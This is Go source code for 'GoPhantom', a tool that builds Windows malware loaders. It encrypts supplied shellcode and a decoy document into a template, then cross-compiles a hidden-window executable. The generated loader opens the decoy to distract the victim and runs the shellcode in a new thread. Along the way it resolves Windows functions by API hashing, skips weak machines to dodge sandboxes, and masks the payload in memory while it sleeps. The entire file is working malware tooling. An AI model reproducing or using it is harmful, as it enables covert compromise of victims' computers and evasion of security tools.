package main

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"flag"
	"gofilepacker/internal/keymgr"
	"io"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"text/template"
)

const logo = `
   ___        ___ _                 _                  
  / _ \___   / _ \ |__   __ _ _ __ | |_ ___  _ __ ___  
 / /_\/ _ \ / /_)/ '_ \ / _' | '_ \| __/ _ \| '_ ' _ \ 
/ /_\\ (_) / ___/| | | | (_| | | | | || (_) | | | | | |
\____/\___/\/    |_| |_|\__,_|_| |_|\__\___/|_| |_| |_|

          >> Advanced Payload Loader Generator <<
                                           by hsad
`

// loaderTemplate v1.3.1: Fixes missing constant definitions.
const loaderTemplate = `
//go:build windows
// +build windows

package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"golang.org/x/crypto/argon2"
	"hash/crc32"
	"os"
	"path/filepath"
	"reflect"
	"runtime"
	"syscall"
	"time"
	"unsafe"
)

// --- Injected Data Constants (FIXED: This block was missing) ---
const (
	encryptedShellcodeBase64 = "{{.EncryptedPayload}}"
	encryptedDecoyBase64     = "{{.EncryptedDecoy}}"
	aesSaltBase64            = "{{.Salt}}"
	decoyFileName            = "{{.DecoyFileName}}"
)

// --- API Hashes ---
const (
	// kernel32.dll
	HASH_KERNEL32DLL    = 0x7547e223
	HASH_VIRTUALALLOC   = 0x9ce0d4a
	HASH_VIRTUALPROTECT = 0x10066f2f
	HASH_CREATETHREAD   = 0x906a06b0

	// shell32.dll
	HASH_SHELL32DLL     = 0x69646261
	HASH_SHELLEXECUTEW  = 0x6142c2a7
)

// --- Win32 Constants ---
const (
	MEM_COMMIT_RESERVE = 0x3000
	PAGE_READWRITE     = 0x04
	PAGE_EXECUTE_READ  = 0x20
	SW_SHOWNORMAL      = 1
)

// --- PE Parsing Structures ---
type IMAGE_DOS_HEADER struct {
	E_magic  uint16
	_        [58]byte
	E_lfanew int32
}

type IMAGE_NT_HEADERS struct {
	Signature      uint32
	FileHeader     [20]byte
	OptionalHeader IMAGE_OPTIONAL_HEADER
}

type IMAGE_OPTIONAL_HEADER struct {
	_             [96]byte
	DataDirectory [16]IMAGE_DATA_DIRECTORY
}

type IMAGE_DATA_DIRECTORY struct {
	VirtualAddress uint32
	Size           uint32
}

type IMAGE_EXPORT_DIRECTORY struct {
	_                     [24]byte
	AddressOfFunctions    uint32
	AddressOfNames        uint32
	AddressOfNameOrdinals uint32
}

// simpleCRC32Hash must match the hasher tool's algorithm.
func simpleCRC32Hash(s string) uint32 {
	return crc32.ChecksumIEEE([]byte(s))
}

// getModuleBase gets the base address of a loaded DLL by its name's hash.
func getModuleBase(moduleHash uint32) uintptr {
	var dllName string
	switch moduleHash {
	case HASH_KERNEL32DLL:
		dllName = "kernel32.dll"
	case HASH_SHELL32DLL:
		dllName = "shell32.dll"
	default:
		return 0
	}
	handle, _ := syscall.LoadLibrary(dllName)
	return uintptr(handle)
}

// getFuncAddress gets a function's address from a DLL's base address by its name's hash.
func getFuncAddress(moduleBase uintptr, funcHash uint32) uintptr {
	if moduleBase == 0 {
		return 0
	}
	dosHeader := (*IMAGE_DOS_HEADER)(unsafe.Pointer(moduleBase))
	ntHeaders := (*IMAGE_NT_HEADERS)(unsafe.Pointer(moduleBase + uintptr(dosHeader.E_lfanew)))
	exportDirRVA := ntHeaders.OptionalHeader.DataDirectory[0].VirtualAddress
	exportDir := (*IMAGE_EXPORT_DIRECTORY)(unsafe.Pointer(moduleBase + uintptr(exportDirRVA)))

	addrOfNames := (*[1 << 30]uint32)(unsafe.Pointer(moduleBase + uintptr(exportDir.AddressOfNames)))
	addrOfFuncs := (*[1 << 30]uint32)(unsafe.Pointer(moduleBase + uintptr(exportDir.AddressOfFunctions)))
	addrOfOrds := (*[1 << 30]uint16)(unsafe.Pointer(moduleBase + uintptr(exportDir.AddressOfNameOrdinals)))

	for i := 0; i < int(exportDir.AddressOfNames); i++ {
		funcNameRVA := addrOfNames[i]
		funcNamePtr := (*byte)(unsafe.Pointer(moduleBase + uintptr(funcNameRVA)))
		
		var funcName string
		sh := (*reflect.StringHeader)(unsafe.Pointer(&funcName))
		sh.Data = uintptr(unsafe.Pointer(funcNamePtr))
		sh.Len = int(strLen(funcNamePtr))

		if simpleCRC32Hash(funcName) == funcHash {
			ordinal := addrOfOrds[i]
			funcRVA := addrOfFuncs[ordinal]
			return moduleBase + uintptr(funcRVA)
		}
	}
	return 0
}

func strLen(s *byte) int {
	var l int
	for ; *s != 0; l++ {
		s = (*byte)(unsafe.Pointer(uintptr(unsafe.Pointer(s)) + 1))
	}
	return l
}


// --- Core Logic ---

func executeShellcode(shellcode []byte, obfuscate bool) {
	kernel32Base := getModuleBase(HASH_KERNEL32DLL)
	if kernel32Base == 0 { return }

	pVirtualAlloc := getFuncAddress(kernel32Base, HASH_VIRTUALALLOC)
	pVirtualProtect := getFuncAddress(kernel32Base, HASH_VIRTUALPROTECT)
	pCreateThread := getFuncAddress(kernel32Base, HASH_CREATETHREAD)
	if pVirtualAlloc == 0 || pVirtualProtect == 0 || pCreateThread == 0 { return }

	addr, _, _ := syscall.SyscallN(pVirtualAlloc, 0, uintptr(len(shellcode)), MEM_COMMIT_RESERVE, PAGE_READWRITE)
	if addr == 0 { return }

	copy((*[1 << 30]byte)(unsafe.Pointer(addr))[:], shellcode)

	if obfuscate {
		sleepObfuscate(addr, uintptr(len(shellcode)))
	}
	
	var oldProtect uint32
	syscall.SyscallN(pVirtualProtect, addr, uintptr(len(shellcode)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	
	syscall.SyscallN(pCreateThread, 0, 0, addr, 0, 0, 0)
}

func openDecoy(decoyPath string) {
	shell32Base := getModuleBase(HASH_SHELL32DLL)
	if shell32Base == 0 { return }

	pShellExecuteW := getFuncAddress(shell32Base, HASH_SHELLEXECUTEW)
	if pShellExecuteW == 0 { return }

	verb, _ := syscall.UTF16PtrFromString("open")
	path, _ := syscall.UTF16PtrFromString(decoyPath)
	
	syscall.SyscallN(pShellExecuteW, 0, uintptr(unsafe.Pointer(verb)), uintptr(unsafe.Pointer(path)), 0, 0, SW_SHOWNORMAL)
}

func main() {
	antiSandboxChecks()

	decoyBytes, err := decryptAESGCM(encryptedDecoyBase64, aesSaltBase64)
	if err == nil {
		decoyPath := filepath.Join(os.Getenv("PUBLIC"), decoyFileName)
		_ = os.WriteFile(decoyPath, decoyBytes, 0644)
		openDecoy(decoyPath)
	}
	
	shellcode, err := decryptAESGCM(encryptedShellcodeBase64, aesSaltBase64)
	if err == nil {
		obfuscate := os.Getenv("GPH_OBFUS") == "1"
		executeShellcode(shellcode, obfuscate)
	}

	time.Sleep(3 * time.Second)
}

// --- Helper functions ---
func decryptAESGCM(encodedCiphertext, encodedSalt string) ([]byte, error) {
	salt, err := base64.StdEncoding.DecodeString(encodedSalt)
	if err != nil { return nil, fmt.Errorf("salt decoding failed: %v", err) }
    const (
        argon2Time = 1; argon2Memory = 64 * 1024; argon2Threads = 4; keyLength = 32
    )
    var argon2Password = []byte("gophantom-static-secret-for-derivation")
	key := argon2.IDKey(argon2Password, salt, argon2Time, argon2Memory, argon2Threads, keyLength)
	ciphertext, err := base64.StdEncoding.DecodeString(encodedCiphertext)
	if err != nil { return nil, fmt.Errorf("ciphertext decoding failed: %v", err) }
	block, err := aes.NewCipher(key)
	if err != nil { return nil, fmt.Errorf("failed to create new cipher: %v", err) }
	gcm, err := cipher.NewGCM(block)
	if err != nil { return nil, fmt.Errorf("failed to create new GCM: %v", err) }
	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize { return nil, fmt.Errorf("ciphertext is too short") }
	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
	return gcm.Open(nil, nonce, ciphertext, nil)
}

func antiSandboxChecks() {
	if runtime.NumCPU() < 2 { os.Exit(0) }
	
	type MEMORYSTATUSEX struct {
		Length                uint32
		MemoryLoad            uint32
		TotalPhys             uint64
		AvailPhys             uint64
		TotalPageFile         uint64
		AvailPageFile         uint64
		TotalVirtual          uint64
		AvailVirtual          uint64
		AvailExtendedVirtual  uint64
	}
	var memInfo MEMORYSTATUSEX
	memInfo.Length = uint32(unsafe.Sizeof(memInfo))

	kernel32Base := getModuleBase(HASH_KERNEL32DLL)
	if kernel32Base == 0 { return }
	globalMemoryStatusEx, _ := syscall.GetProcAddress(syscall.Handle(kernel32Base), "GlobalMemoryStatusEx")

	if globalMemoryStatusEx != 0 {
		ret, _, _ := syscall.SyscallN(globalMemoryStatusEx, uintptr(unsafe.Pointer(&memInfo)))
		if ret != 0 {
			if memInfo.TotalPhys/1024/1024/1024 < 4 {
				os.Exit(0)
			}
		}
	}
}

func sleepObfuscate(address uintptr, size uintptr) {
	key := make([]byte, 8)
	_, err := rand.Read(key)
	if err != nil {
		time.Sleep(5 * time.Second)
		return
	}
	mem := (*[1 << 30]byte)(unsafe.Pointer(address))[:size:size]
	for i := 0; i < len(mem); i++ {
		mem[i] ^= key[i%8]
	}
	time.Sleep(5 * time.Second)
	for i := 0; i < len(mem); i++ {
		mem[i] ^= key[i%8]
	}
}
`

type TemplateData struct {
	EncryptedPayload string
	EncryptedDecoy   string
	Salt             string
	DecoyFileName    string
}

func encryptAESGCM(plaintext []byte, key []byte) (string, error) {
	block, err := aes.NewCipher(key)
	if err != nil {
		return "", err
	}
	gcm, err := cipher.NewGCM(block)
	if err != nil {
		return "", err
	}
	nonce := make([]byte, gcm.NonceSize())
	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		return "", err
	}
	ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)
	return base64.StdEncoding.EncodeToString(ciphertext), nil
}

func main() {
	log.SetFlags(0)
	log.Println(logo)

	decoyFile := flag.String("decoy", "", "Required: Path to the decoy file (e.g., a PDF or image).")
	payloadFile := flag.String("payload", "", "Required: Path to the raw x64 shellcode file (e.g., beacon.bin).")
	outputFile := flag.String("out", "FinalLoader.exe", "Optional: Final output executable name.")
	flag.Parse()

	if *decoyFile == "" || *payloadFile == "" {
		log.Println("\nError: Both -decoy and -payload flags are required.")
		log.Println("Usage:")
		flag.PrintDefaults()
		os.Exit(1)
	}

	decoyBytes, err := os.ReadFile(*decoyFile)
	if err != nil {
		log.Fatalf("[-] Failed to read decoy file: %v", err)
	}
	shellcodeBytes, err := os.ReadFile(*payloadFile)
	if err != nil {
		log.Fatalf("[-] Failed to read payload file: %v", err)
	}

	log.Println("[+] Deriving AES-256 key using Argon2id...")
	aesKey, salt, err := keymgr.DeriveKeyAndSalt()
	if err != nil {
		log.Fatalf("[-] Failed to derive key and salt: %v", err)
	}

	log.Println("[+] Encrypting decoy file with derived key...")
	encryptedDecoy, err := encryptAESGCM(decoyBytes, aesKey)
	if err != nil {
		log.Fatalf("[-] Failed to encrypt decoy file: %v", err)
	}

	log.Println("[+] Encrypting payload file with the same derived key...")
	encryptedShellcode, err := encryptAESGCM(shellcodeBytes, aesKey)
	if err != nil {
		log.Fatalf("[-] Failed to encrypt payload file: %v", err)
	}

	data := TemplateData{
		EncryptedPayload: encryptedShellcode,
		EncryptedDecoy:   encryptedDecoy,
		Salt:             base64.StdEncoding.EncodeToString(salt),
		DecoyFileName:    filepath.Base(*decoyFile),
	}

	log.Println("[+] Generating loader source code...")
	tmpl, err := template.New("loader").Parse(loaderTemplate)
	if err != nil {
		log.Fatalf("[-] Failed to parse loader template: %v", err)
	}

	var sourceCode bytes.Buffer
	if err := tmpl.Execute(&sourceCode, data); err != nil {
		log.Fatalf("[-] Failed to execute template: %v", err)
	}

	tmpfile, err := os.CreateTemp("", "loader-*.go")
	if err != nil {
		log.Fatalf("[-] Failed to create temp file: %v", err)
	}
	defer os.Remove(tmpfile.Name())

	if _, err := tmpfile.Write(sourceCode.Bytes()); err != nil {
		log.Fatalf("[-] Failed to write to temp file: %v", err)
	}
	if err := tmpfile.Close(); err != nil {
		log.Fatalf("[-] Failed to close temp file: %v", err)
	}

	log.Printf("[+] Cross-compiling for windows/amd64 to %s...", *outputFile)
	log.Println("[+] Evasion feature 'Sleep-Obfuscation' included. (Activate on target with env: GPH_OBFUS=1)")

	ldflags := "-s -w -H windowsgui"
	cmd := exec.Command("go", "build", "-o", *outputFile, "-ldflags", ldflags, tmpfile.Name())
	cmd.Env = append(os.Environ(), "GOOS=windows", "GOARCH=amd64", "CGO_ENABLED=0")

	output, err := cmd.CombinedOutput()
	if err != nil {
		log.Fatalf("[-] Compilation failed:\n%s", string(output))
	}

	log.Printf("\n[✓] Successfully generated loader: %s\n", *outputFile)
}
